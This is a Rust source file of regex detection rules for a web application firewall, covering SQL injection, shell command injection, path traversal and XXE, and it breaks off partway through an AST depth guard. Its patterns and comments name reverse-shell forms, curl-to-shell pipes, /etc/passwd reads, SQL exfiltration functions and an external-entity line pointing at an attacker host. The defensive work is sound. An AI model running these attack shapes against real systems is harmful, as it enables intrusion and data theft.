//! Lane 2 production semantic detectors (plan v2.2 §8).
//!
//! P1b shipped the first real detector, [`StructuralSqlDetector`]; **P1c adds two
//! more** — [`RceStructuralDetector`] (shell command injection) and
//! [`TraversalStructuralDetector`] (encoded / obfuscated path traversal). Each is
//! an `OpenRASP`-style **structural / regex half-semantic** detector, deliberately
//! *not* an AST parser (`sqlparser-rs` is P2). Each inspects the
//! normalised (`lower_trunc`) form of each preprocessor [`View`] and returns a
//! context-free [`DetectionFinding`]; the pipeline
//! ([`View::to_signal`](super::preprocess::View::to_signal)) attaches
//! provenance / field / scope / detector-id, so a detector can never forge the
//! provenance that gates hard-veto eligibility (codex A-1).
//!
//! **Shadow only in P1b**: the `SQLi` family ships with `enforcement_mode =
//! log_only`, so a match is at most logged + persisted, never a Block.

use std::borrow::Cow;

use brush_parser::ParserOptions;
use brush_parser::ast as shell_ast;
use brush_parser::word::{self as shell_word, WordPiece, WordPieceWithSource};
use regex::Regex;
use sqlparser::ast::{BinaryOperator, Expr, ObjectName, ObjectNamePart, SetExpr, Statement};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use tracing::error;

use super::budget::ContentInspectionState;
use super::preprocess::{PreprocessCtx, SemanticDetector, View};
use super::types::{AttackKind, Confidence, DetectionFinding, DetectorId};

/// How a compiled rule decides whether it fired.
enum RuleKind {
    /// Fires when the pattern matches at least once.
    Presence,
    /// Fires when the pattern matches at least this many times (density / frequency).
    Count(usize),
}

/// One compiled structural rule (shared by every structural detector — `SQLi`,
/// `RCE`, `Traversal`).
struct CompiledRule {
    /// Stable matching key (hard-veto allowlist matches on this, never `detail`).
    rule_key: &'static str,
    /// Graded confidence `0..=100` (shadow starting values, pre-holdout
    /// calibration — plan §6.6 / §8.2).
    confidence: u8,
    re: Regex,
    kind: RuleKind,
}

/// One row of a rule table: `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default: a
/// high-noise pattern that requires holdout calibration before it may run in
/// production (plan v2.2). [`compile_table`] compiles only the `default_on`
/// subset unless `all` is set (test-only).
type RuleRow = (&'static str, u8, &'static str, RuleKind, bool);

/// Compile a rule table, keeping either the default-on subset or every row.
///
/// A pattern that fails to compile (a bug — the patterns are constants) is
/// logged and skipped rather than panicking, so a detector degrades to a smaller
/// rule set instead of aborting startup (iron rule: no panic in production).
fn compile_table(table: &[RuleRow], all: bool, who: &str) -> Vec<CompiledRule> {
    let mut rules = Vec::with_capacity(table.len());
    for (rule_key, confidence, pattern, kind, default_on) in table {
        if !all && !*default_on {
            continue;
        }
        match Regex::new(pattern) {
            Ok(re) => rules.push(CompiledRule {
                rule_key,
                confidence: *confidence,
                re,
                kind: match kind {
                    RuleKind::Presence => RuleKind::Presence,
                    RuleKind::Count(n) => RuleKind::Count(*n),
                },
            }),
            Err(e) => error!("{who}: rule '{rule_key}' failed to compile: {e}"),
        }
    }
    rules
}

/// Return the strongest firing rule (highest confidence) over the haystack, or
/// `None` when nothing fired.
fn best_match<'a>(rules: &'a [CompiledRule], hay: &str) -> Option<&'a CompiledRule> {
    let mut best: Option<&CompiledRule> = None;
    for rule in rules {
        let fired = match rule.kind {
            RuleKind::Presence => rule.re.is_match(hay),
            RuleKind::Count(min) => rule.re.find_iter(hay).take(min).count() >= min,
        };
        if fired && best.is_none_or(|b| rule.confidence > b.confidence) {
            best = Some(rule);
        }
    }
    best
}

/// Build a de-identified [`DetectionFinding`] from the winning rule — it names
/// the rule and confidence, and **never** echoes the payload.
fn finding_for(rule: &CompiledRule, attack: AttackKind, family: &str) -> DetectionFinding {
    DetectionFinding {
        attack,
        confidence: Confidence::saturating(rule.confidence),
        rule_key: rule.rule_key,
        detail: std::borrow::Cow::Owned(format!(
            "structural {family} rule '{}' matched (confidence {})",
            rule.rule_key, rule.confidence
        )),
    }
}

/// The rule table (plan §8.2). Patterns run against the **lowercased** normalised
/// view text, so every pattern is authored lowercase. Ordered high→low
/// confidence for readability; `detect` returns the strongest firing rule.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default (plan
/// v2.2: the high-noise stacked / chr / hex / `information_schema` rules require
/// holdout calibration before they may run). [`StructuralSqlDetector::new`]
/// compiles only the `default_on` rules; [`StructuralSqlDetector::with_all_rules`]
/// (test-only) compiles the whole table.
const RULES: &[RuleRow] = &[
    // Exfiltration / file write.
    (
        "sql.into_outfile",
        95,
        r"\binto\s+(outfile|dumpfile)\b",
        RuleKind::Presence,
        true,
    ),
    // Stacked query: a statement separator followed by another statement keyword.
    // DEFAULT-OFF (plan v2.2): fires on prose / code `; select …` with no SQL
    // context; needs holdout calibration before it may run.
    (
        "sql.stacked",
        90,
        r";\s*(select|insert|update|delete|drop|create|alter|union|declare|exec|grant)\b",
        RuleKind::Presence,
        false,
    ),
    // Dangerous functions / time-based blind primitives. The call-paren form
    // (`sleep(`, `benchmark(`, …) or `waitfor delay` is required.
    (
        "sql.dangerous_fn",
        85,
        r"\b(load_file|benchmark|sleep|pg_sleep|updatexml|extractvalue|xp_cmdshell)\s*\(|\bwaitfor\s+delay\b",
        RuleKind::Presence,
        true,
    ),
    // UNION-based with NULL / numeric / comma padding (column-count probing).
    // Requires adjacent `union [all|distinct] select` (SQL context), not just
    // `union … select` separated by arbitrary prose.
    (
        "sql.union_null",
        78,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b.{0,80}?(\bnull\b|,\s*null|,\s*,|\b\d+\s*,\s*\d+)",
        RuleKind::Presence,
        true,
    ),
    // General UNION SELECT — requires adjacent `union [all|distinct] select`.
    (
        "sql.union_select",
        72,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b",
        RuleKind::Presence,
        true,
    ),
    // MySQL version-gated comment `/*!12345 …*/` — requires a digit right after
    // `/*!` (a real version gate), so a plain `/*! license */` banner does not fire.
    ("sql.version_comment", 70, r"/\*!\d", RuleKind::Presence, true),
    // information_schema enumeration. DEFAULT-OFF (plan v2.2); also narrowed to
    // the structural `information_schema.tables|columns` form (a bare
    // `information_schema` field name no longer fires).
    (
        "sql.info_schema",
        65,
        r"\binformation_schema\s*\.\s*(tables|columns)\b",
        RuleKind::Presence,
        false,
    ),
    // chr()/char() obfuscation frequency ≥ 5. DEFAULT-OFF (plan v2.2): code /
    // formulas with repeated `char(` calls false-positive.
    ("sql.chr_freq", 45, r"\b(chr|char)\s*\(", RuleKind::Count(5), false),
    // Hex-literal density ≥ 2. DEFAULT-OFF (plan v2.2): log lines / on-chain data
    // with `0x…` constants false-positive. Token-bounded (`\b`).
    ("sql.hex_const", 40, r"\b0x[0-9a-f]+\b", RuleKind::Count(2), false),
];

/// `OpenRASP`-derived structural `SQLi` detector (plan §8). Registered in the
/// `SQLi` attack family; matches on the normalised view text.
pub struct StructuralSqlDetector {
    rules: Vec<CompiledRule>,
}

impl StructuralSqlDetector {
    /// Compile the **default-on** rules. A pattern that fails to compile (a bug —
    /// the patterns are constants) is logged and skipped rather than panicking, so
    /// the detector degrades to a smaller rule set instead of aborting startup
    /// (iron rule: no panic in production).
    ///
    /// The high-noise stacked / chr / hex / `information_schema` rules are
    /// `default_on = false` (plan v2.2) and are **not** compiled here; they await
    /// holdout calibration before they may run in production.
    #[must_use]
    pub fn new() -> Self {
        Self::compile(false)
    }

    /// Test-only constructor that compiles **every** rule in the table, including
    /// the default-off high-noise rules, so unit tests can exercise them.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self::compile(true)
    }

    /// Compile the rule table, keeping either the default-on subset or all rules.
    #[must_use]
    fn compile(all: bool) -> Self {
        Self {
            rules: compile_table(RULES, all, "StructuralSqlDetector"),
        }
    }
}

impl Default for StructuralSqlDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for StructuralSqlDetector {
    fn id(&self) -> DetectorId {
        DetectorId::StructRule
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::SqlInjection, "SQLi"))
    }
}

// ── RCE (shell command injection) structural detector (plan §8, P1c) ──────────

/// Self-authored shell command-injection rule table (plan §8.3). Patterns run
/// against the **lowercased** normalised view text (authored lowercase). The
/// legacy Lane 1 [`crate::checks::RceCheck`] veto stays frozen and runs first;
/// this additive detector fires on the Lane-2-only decode/normalise views
/// (base64 / hex / html-entity / SQL-comment strip / **shell de-obfuscation**)
/// that Lane 1's raw URL-decode-only path cannot see (fire-drill 2026-07-22).
///
/// Every rule is **context-narrowed** to defeat the classic false positives:
/// a bare `|` / `&` / `sh` / `nc` / `$(` never fires on its own — a command
/// separator must be followed by a real dangerous binary, a command
/// substitution must wrap a real command, `sh`/`bash` require the `-c`/`-i`/`-e`
/// exec form (codex P1b §3.2 discipline).
///
/// `default_on = false` marks the high-noise rules (a bare separator + common
/// command, backtick-wraps-anything) that await holdout calibration.
const RCE_RULES: &[RuleRow] = &[
    // Reverse-shell fingerprints: `/dev/tcp` redirect, `bash -i`, `nc -e/-c`.
    // These are complete reverse-shell structures with very low FP. A bare
    // `mkfifo` is DELIBERATELY NOT here (codex A-4): `mkfifo` is an ordinary POSIX
    // utility that appears in docs / ops tooling, so it must not single-handedly
    // reach confidence 92 — the FIFO reverse-shell form is caught by the
    // default-off `rce.mkfifo_revshell` joint rule below (FIFO + shell/nc).
    (
        "rce.reverse_shell",
        92,
        r"/dev/(tcp|udp)/|\b(ba)?sh\s+-i\b|\bn(c|cat)\s+-[ec]\b|>&\s*/dev/(tcp|udp)",
        RuleKind::Presence,
        true,
    ),
    // Interpreter exec flag: `sh -c` / `bash -c` / `python -c` / `perl -e` /
    // `powershell -enc` — the inline-code-execution idiom.
    (
        "rce.shell_exec_flag",
        82,
        r"\b(sh|bash|zsh|dash|python[0-9.]*|perl|ruby|php|powershell|pwsh)\s+-(c|e|enc|encodedcommand)\b",
        RuleKind::Presence,
        true,
    ),
    // Command substitution wrapping a real command: `$(id)`, `$(cat /etc/passwd)`.
    // Narrowed to the `$(` form ONLY (codex A-4): jQuery `$('#x')` / `$(document)`
    // do not fire (the char after `$(` must lead into a known command, not a
    // quote), and the backtick form — which false-positives on Markdown command
    // spans like `` `curl --help` `` — moved to the default-off `rce.backtick_cmd`.
    (
        "rce.cmd_subst",
        80,
        r"\$\(\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig|sleep|ping)\b",
        RuleKind::Presence,
        true,
    ),
    // Pipe into an interpreter: `... | sh`, `curl x | bash`.
    (
        "rce.piped_shell",
        78,
        r"\|\s*(sh|bash|zsh|dash|python[0-9.]*|perl)(\s|$)",
        RuleKind::Presence,
        true,
    ),
    // Separator (`;` `|` `&&` `$(`) followed by a fetch tool WITH an argument:
    // `; wget http://…`, `| curl -o …`. A SINGLE `&` is NOT a separator here
    // (codex A-4): in a query/form/prose `&` is the field separator, so `&curl
    // help` must stay clean; only `&&` counts. A backtick is likewise excluded —
    // a Markdown span `` `curl --help` `` must not fire (the backtick fetch form is
    // covered by the default-off `rce.backtick_cmd`). The trailing `\S` requires a
    // real argument, so `&method=curl&x=1` and a bare `curl` word both stay clean.
    (
        "rce.fetch_exec",
        75,
        r"(?:[;|]|&&|\$\()\s*(wget|curl|certutil|nslookup|tftp)\s+\S",
        RuleKind::Presence,
        true,
    ),
    // Reading a sensitive file via a reader command — the shape a de-obfuscated
    // `cat$IFS/etc/passwd` collapses to after shell normalisation.
    (
        "rce.sensitive_read",
        70,
        r"\b(cat|less|more|head|tail|nl|od|xxd|strings)\s+/?(etc/passwd|etc/shadow|proc/self|proc/version)",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4, joint structure): a FIFO reverse shell — `mkfifo`
    // followed (within a short window) by a shell / netcat reader, e.g.
    // `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i … | nc …`. Requiring the joint
    // structure keeps a bare `mkfifo` doc/word from firing; ships disabled pending
    // holdout calibration.
    (
        "rce.mkfifo_revshell",
        90,
        r"\bmkfifo\b.{0,60}\b(nc|ncat|sh|bash)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a bare separator + a common command. `; ls`,
    // `| cat`, `&& echo` occur in prose / shell snippets / params, so this
    // awaits holdout calibration before running.
    (
        "rce.cmd_sep_common",
        45,
        r"[;|&]\s*(cat|ls|id|rm|cp|mv|chmod|chown|echo|ping|kill|ps|whoami|uname|pwd|dir|type)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (codex A-4, high-noise): a backtick wrapping a known command —
    // Markdown command spans (`` `curl --help` ``) false-positive heavily, so the
    // backtick command-substitution form ships disabled pending holdout data. The
    // `$(cmd)` form stays default-on above.
    (
        "rce.backtick_cmd",
        78,
        r"`\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig)\b",
        RuleKind::Presence,
        false,
    ),
];

/// Self-authored structural RCE / command-injection detector (plan §8, P1c).
/// Registered in the `RCE` attack family; matches on the normalised view text.
pub struct RceStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl RceStructuralDetector {
    /// Compile the **default-on** rules (the high-noise `cmd_sep_common` /
    /// `backtick_any` rules await holdout calibration and are not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(RCE_RULES, false, "RceStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(RCE_RULES, true, "RceStructuralDetector"),
        }
    }
}

impl Default for RceStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for RceStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Rce
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Rce, "RCE"))
    }
}

// ── Traversal T1 (encoded path traversal) structural detector (plan §8, P1c) ──

/// Encoded / obfuscated path-traversal rule table (plan §8.4, "T1"). **T0** is
/// the frozen Lane 1 [`crate::checks::DirTraversalCheck`] veto (raw `../`,
/// `%2e%2e`, overlong, sensitive absolute paths on the URL-decode-only path);
/// it is unchanged and runs first. This additive **T1** detector re-catches the
/// same structures on the Lane-2-only decode views (base64 / hex / html-entity /
/// shell-normalised) — a traversal wrapped in base64, or split by quotes so the
/// `/etc/passwd` literal never appears raw, is invisible to Lane 1 but surfaces
/// here after the semantic preprocessor decodes it.
///
/// The plain-`../` rule is **default-off**: relative paths / JS imports
/// (`import x from '../util'`) make a bare `../` far too noisy to run by default
/// (P1b FP discipline). The encoded / overlong / sensitive-absolute rules are
/// default-on: those forms are almost never legitimate.
const TRAVERSAL_RULES: &[RuleRow] = &[
    // Overlong / invalid-UTF-8 encodings of `../` — always malicious.
    (
        "traversal.overlong",
        82,
        r"\.\.(%c0%af|%c1%9c|%e0%80%af)|%c0%ae%c0%ae|%c0%2e%c0%2e",
        RuleKind::Presence,
        true,
    ),
    // Percent-encoded dot-dot: `%2e%2e/`, `..%2f`, `..%5c`, double-encoded
    // `%252e%252e/`. Every alternative requires a following path separator (codex
    // A-4 must-fix): a bare `%252e%252e` (or `%2e%2e`) is only an encoded `..`
    // (as in a filename `photo%252e%252ejpg`, or a triple encoded dot
    // `%252e%252e%252e` with no separator at all) and is NOT traversal on its
    // own. A further encoded *dot* (`%2e` / `%252e`) is NOT a separator and is
    // deliberately excluded from the following-character set (the earlier
    // must-fix bug: it let an unbounded run of encoded dots fire without ever
    // requiring a `/` or `\`).
    //   * single-encoded `%2e%2e` must be followed by a REAL separator: raw
    //     `/`/`\` or single-encoded `%2f`/`%5c`;
    //   * double-encoded `%252e%252e` must be followed by either the fully
    //     double-encoded separator `%252f`/`%255c`, or a mixed-depth single
    //     separator (`%2f`/`%5c`/`/`/`\`) — mixed-encoding-depth traversal is a
    //     real bypass vector seen in the wild and is intentionally kept.
    // Encoded traversal with a genuine separator is essentially never
    // legitimate traffic.
    (
        "traversal.encoded_dotdot",
        75,
        r"%2e%2e(%2f|%5c|/|\\)|%252e%252e(%252f|%255c|%2f|%5c|/|\\)|\.\.%2f|\.\.%5c|%2e%2e%2f",
        RuleKind::Presence,
        true,
    ),
    // Sensitive absolute path revealed after decoding (base64/hex/normalise).
    // Kept to a TIGHT, unambiguous list (codex A-4) — only paths that are almost
    // never legitimate to request: `/etc/passwd`, `/etc/shadow`, SSH keys, Windows
    // system32 / win.ini / boot.ini. High-frequency legitimate ops/container paths
    // (`/etc/hosts`, `/proc/self`, `/proc/version`) are NOT here — they moved to
    // the default-off `traversal.sensitive_abs_ops` rule so ordinary ops traffic
    // does not trip a shadow event.
    (
        "traversal.sensitive_abs",
        68,
        r"/etc/(passwd|shadow)\b|/root/\.ssh/|(/|\\)windows(/|\\)(system32|win\.ini)|\bboot\.ini\b",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4): high-frequency legitimate absolute paths that are
    // only weak traversal evidence on their own — `/etc/hosts`, `/proc/self`,
    // `/proc/<pid>/`. A reader command in front of them still fires the default-on
    // `rce.sensitive_read` rule; this bare-path form awaits holdout calibration.
    (
        "traversal.sensitive_abs_ops",
        55,
        r"/etc/hosts\b|/proc/self\b|/proc/version\b|/proc/[0-9]+/",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a plain decoded `../` / `..\`. Also catches the
    // `....//` double-write bypass (it contains `../` as a substring). Relative
    // imports / paths make this too noisy to run before holdout calibration.
    ("traversal.plain_dotdot", 50, r"\.\.[/\\]", RuleKind::Presence, false),
];

/// Encoded path-traversal (T1) structural detector (plan §8, P1c). Registered in
/// the `Traversal` attack family; matches on the normalised view text.
pub struct TraversalStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl TraversalStructuralDetector {
    /// Compile the **default-on** rules (the noisy plain-`../` rule awaits
    /// holdout calibration and is not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, false, "TraversalStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off plain-`../`.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, true, "TraversalStructuralDetector"),
        }
    }
}

impl Default for TraversalStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for TraversalStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Traversal
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Traversal, "Traversal"))
    }
}

// ── XXE (XML external entity) structural detector (plan §T2-A) ────────────────

/// XXE structural rule table (plan T2-A). Matches the DTD / prolog structures
/// that mark an XML-external-entity attack on the **normalised view text** — the
/// same `lower_trunc` surface every other structural detector uses.
///
/// **No XML parser is invoked.** The XXE-relevant grammar (`<!DOCTYPE>` /
/// `<!ENTITY>` / `SYSTEM` / `PUBLIC` / parameter entities `%name;`) lives entirely
/// in the DTD/prolog and is a set of textual markers a regex matches precisely;
/// a full parse buys nothing here (`quick-xml`, the tree's XML reader used by Lane
/// B field extraction, is a non-validating pull parser that never expands the
/// internal subset anyway — it would hand back the raw DOCTYPE text to be scanned
/// exactly like this). Crucially, *not* parsing removes the entire parse-time `DoS`
/// surface the red-line calls out (billion-laughs entity expansion / deep element
/// nesting / oversized entities): there is no expansion step to weaponise. The
/// input the detector sees is already length- and token-bounded by the
/// preprocessor (`max_field_input_bytes`, `MAX_TOKEN_LEN`, `max_tokens`), so every
/// rule is a bounded linear scan; the billion-laughs indicator is a bounded
/// frequency **count** ([`RuleKind::Count`]) of entity declarations, never an
/// expansion.
///
/// FP discipline mirrors the other families: the strong, essentially-never-benign
/// structures (external entity declaration, parameter-entity definition) ship
/// **default-on**; the noisy structures that also occur in legitimate XML
/// (external `<!DOCTYPE … PUBLIC "…//DTD…" "http://…">` as used by every XHTML
/// page, a bare `%name;` reference, a handful of internal entity declarations)
/// ship **default-off** and await holdout calibration.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const XXE_RULES: &[RuleRow] = &[
    // External entity declaration: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` or
    // the OOB parameter form `<!ENTITY % xxe SYSTEM "http://evil/x">`. A named
    // entity resolved from an external `SYSTEM`/`PUBLIC` identifier is the classic
    // XXE primitive and is essentially never present in legitimate request data.
    // DEFAULT-ON, high confidence.
    (
        "xxe.entity_external",
        90,
        r"<!entity\s+(%\s+)?\S+\s+(system|public)\b",
        RuleKind::Presence,
        true,
    ),
    // Parameter-entity DEFINITION: `<!ENTITY % name …>`. Parameter entities are a
    // DTD-authoring construct that drives blind / out-of-band XXE and the
    // parameter-entity billion-laughs variant; they essentially never appear in
    // benign request bodies. Catches the INTERNAL form too (no external id), which
    // `entity_external` does not. DEFAULT-ON.
    (
        "xxe.param_entity_def",
        80,
        r"<!entity\s+%\s+\S",
        RuleKind::Presence,
        true,
    ),
    // External DOCTYPE: `<!DOCTYPE root SYSTEM "…">` / `<!DOCTYPE root PUBLIC "…"
    // "…">`. Weaker signal — a legitimate XHTML page ships
    // `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/…">`,
    // so the `PUBLIC` form is genuinely benign on HTML-ish traffic. DEFAULT-OFF
    // pending holdout calibration; the HTML5 `<!DOCTYPE html>` (no external id)
    // never matches this rule regardless.
    (
        "xxe.doctype_external",
        60,
        r"<!doctype\s+\S+\s+(system|public)\b",
        RuleKind::Presence,
        false,
    ),
    // Bare parameter-entity REFERENCE `%name;` (letter-initial name). Strong when
    // paired with a definition, but noisy alone — stray text / encoded fragments
    // can incidentally produce `%word;`. DEFAULT-OFF pending calibration.
    (
        "xxe.param_entity_ref",
        55,
        r"%[a-z_][a-z0-9_.:-]*;",
        RuleKind::Presence,
        false,
    ),
    // Internal-entity expansion (billion-laughs family): several `<!ENTITY …>`
    // declarations in one document. A bounded frequency COUNT — the linear,
    // parse-free billion-laughs indicator (each declaration is counted, nothing is
    // expanded). DEFAULT-OFF: a legitimate DTD may declare a few entities, so this
    // needs holdout calibration before it runs. Note the external / parameter
    // variants are already caught default-on above; this catches the purely
    // internal `<!ENTITY lolN "&lolM;…">` recursion.
    ("xxe.entity_expansion", 65, r"<!entity\b", RuleKind::Count(3), false),
];

/// Structural XXE (XML external entity) detector (plan T2-A).
///
/// Registered in the `Xxe` attack family; matches on the normalised view text.
/// Single-detector family — no corroboration partner — so FP control is by narrow
/// default-on rules + default-off high-noise rules, per the plan §四.3 invariant.
pub struct XxeStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl XxeStructuralDetector {
    /// Compile the **default-on** rules (external entity / parameter-entity
    /// definition). The noisy external-DOCTYPE, bare-`%name;` and internal-entity
    /// -expansion rules await holdout calibration and are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(XXE_RULES, false, "XxeStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(XXE_RULES, true, "XxeStructuralDetector"),
        }
    }
}

impl Default for XxeStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for XxeStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::XxeStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Xxe, "XXE"))
    }
}

// ── AST SQLi detector (sqlparser-rs true parse, plan §11, P2) ─────────────────

/// Maximum bracket / prefix-operator nesting depth we will hand to `sqlparser`.
///
/// **Primary stack-safety guard (P2 recursive-protection decision).** We build
/// `sqlparser` with `default-features = false`, which drops the
/// `recursive-protection` feature and its `psm` dependency (a C build + `unsafe`) —
/// keeping the supply chain zero-C / zero-unsafe (iron rule). Without that feature
/// the parser has **no** stack guard: its `with_recursion_limit` is a no-op, and
/// its recursive descent overflows a 2 MiB worker-thread stack once nesting grows
/// large enough. The per-frame stack cost differs by construct, so the overflow
/// floor does too — measured (2 MiB stack) at, release / debug builds:
/// `case`/`not` ≈ 240 / 18, `(((…)))` ≈ 329 / 60, unary `- -` ≈ 376 / 60. The
/// smallest floor is `case`/`not` at ~18 frames in a debug build. `12` sits below
/// even that, so [`ast_structural_depth_ok`] — which counts **every** recursion
/// driver reachable in `GenericDialect` (brackets, `case`, `not`, `interval`, and
/// the unary prefixes `+ - ~ !`) — never admits an input the parser could recurse
/// near an overflow on. A rejected input simply yields no AST signal (fail-open —
/// the structural detector still runs). `+`/`-` were the P2 gap: they drive unary
/// recursion but were not counted, so a `1 or 1 < - - … 1` chain slipped past the
/// old scan and could abort the worker; they are counted now, and
/// [`AST_MAX_INPUT_BYTES`] is a second, independent cap in case any driver is ever
/// missed again.
const MAX_AST_NESTING: usize = 12;

/// Belt-and-suspenders stack-safety cap: the maximum input byte length handed to
/// the AST path, independent of the per-driver [`MAX_AST_NESTING`] scan.
///
/// Each parser recursion consumes at least one token, and every token is at least
/// one byte, so the recursion depth of any parse is **at most the input byte
/// length** — the densest driver (`(`, `~`) costs exactly one frame per byte. An
/// input capped at `256` bytes can therefore drive at most ~256 value frames plus
/// the fixed `select * from t where c = …` wrapper (a small constant), staying
/// below the lowest measured one-frame-per-byte overflow floor (`(((…)))` at ~329
/// release frames) with margin. This holds **regardless** of which operators the
/// cheap scan above happens to enumerate, so even a future `sqlparser` prefix
/// entry the scan does not know about cannot overflow the stack through this path.
/// A longer input is declined for AST (fail-open — the structural detector still
/// runs). Real injection structures the AST layer targets are far shorter than
/// this cap.
const AST_MAX_INPUT_BYTES: usize = 256;

/// Recursion limit handed to `sqlparser` as defence-in-depth. It is a no-op in
/// the current `recursive-protection`-off build (the real guard is
/// [`ast_structural_depth_ok`]); it is set above [`MAX_AST_NESTING`] so it can
/// never spuriously reject an input the depth guard already admitted, while still
/// catching a runaway should a future `sqlparser` version begin enforcing it.
const AST_RECURSION_LIMIT: usize = 20;

/// SQL functions whose presence in a value context is a time-based / blind /
/// exfiltration primitive (mirrors the structural `sql.dangerous_fn` set). A
/// benign scalar value never contains one of these calls.
const AST_DANGEROUS_FNS: &[&str] = &[
    "sleep",
    "pg_sleep",
    "benchmark",
    "load_file",
    "updatexml",
    "extractvalue",
    "xp_cmdshell",
];

/// Cheap pre-filter: only spend an AST parse attempt when the input plausibly
/// carries SQL structure. A benign scalar (number / word / UUID / prose) matches
/// nothing here, so the overwhelming majority of traffic skips the parser (and the
/// AST budget) entirely — clean traffic never even reaches [`ContentInspectionState::try_take_ast_attempt`].
///
/// Liberal by design on the safe side: a benign value that slips through simply
/// fails to parse or yields no injection AST (the classifier, not this gate, is
/// the correctness boundary). Bare `or` / `and` (common English) only qualify when
/// a comparison operator is also present, so prose like `active or inactive` never
/// spends a parse attempt.
fn ast_prefilter(s: &str) -> bool {
    // Strong keyword tokens (word-bounded) — rarely appear in benign values.
    const STRONG_KW: &[&str] = &[
        "union",
        "select",
        "sleep",
        "benchmark",
        "load_file",
        "updatexml",
        "extractvalue",
        "xp_cmdshell",
        "waitfor",
        "insert",
        "update",
        "delete",
        "drop",
        "exec",
    ];
    const BOOL_KW: &[&str] = &["or", "and"];
    // Punctuation-level injection markers.
    if s.contains('\'') || s.contains(';') || s.contains("--") || s.contains("/*") || s.contains('#') {
        return true;
    }
    let mut has_bool = false;
    for tok in s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')) {
        if STRONG_KW.contains(&tok) {
            return true;
        }
        if BOOL_KW.contains(&tok) {
            has_bool = true;
        }
    }
    // `or` / `and` count only alongside a comparison operator (a real boolean
    // injection: `1 or 1=1`), never on their own (`cats and dogs`).
    has_bool && (s.contains('=') || s.contains('<') || s.contains('>'))
}

/// Over-approximation of `sqlparser`'s recursion depth, used purely as a
/// stack-overflow guard (see [`MAX_AST_NESTING`]). The estimated recursion depth is
/// `max bracket nesting + total paren-less keyword/prefix recursion drivers`:
///
/// * bracket nesting (`(` / `[`) drives paren / function / subquery / `exists`
///   recursion (all of which descend through a bracket);
/// * the paren-less prefix operators `not`, `case`, `interval`, and the unary signs
///   `+ - ~ !` nest **without** brackets — and their *total* count upper-bounds any
///   consecutive run or nesting depth.
///
/// The unary `+`/`-` signs were the P2 gap (they drive `parse_prefix` recursion but
/// were previously uncounted, so a space-separated `- - … ` chain estimated depth
/// `0` and could overflow the stack); they are counted here now. Because the count
/// over-approximates it rejects strictly more than necessary — always the safe
/// (fail-open) direction. This scan is the primary guard; [`AST_MAX_INPUT_BYTES`]
/// is a byte-length backstop applied first, so a driver this scan might not know
/// about still cannot overflow the stack.
fn ast_structural_depth_ok(s: &str) -> bool {
    // Backstop: bound recursion by input length regardless of the driver scan
    // below (depth <= tokens <= bytes).
    if s.len() > AST_MAX_INPUT_BYTES {
        return false;
    }

    let mut bracket: usize = 0;
